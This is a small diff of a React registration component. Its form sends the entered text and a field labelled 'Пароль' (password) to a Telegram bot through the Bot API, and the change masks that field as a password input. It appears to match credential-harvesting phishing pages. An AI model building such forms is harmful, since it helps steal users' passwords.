@@ -13,7 +13,7 @@ const Reg = () => {
     const sendMessage = async(e)=>{
         e.preventDefault();
         
-        const xabar = `yangi xabar ${text}\n tel: ${number}`
+        const xabar = `yangi xabar: ${text}\n tel: ${number}`
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
         
         try{
@@ -59,7 +59,7 @@ const Reg = () => {
                             onChange={(e)=>setText(e.target.value)}
                             />
                             <input className='reg__input2' 
-                            type="number" 
+                            type="password" 
                             placeholder='Пароль' 
                             value={number}
                             onChange={(e)=>setNumber(e.target.value)}
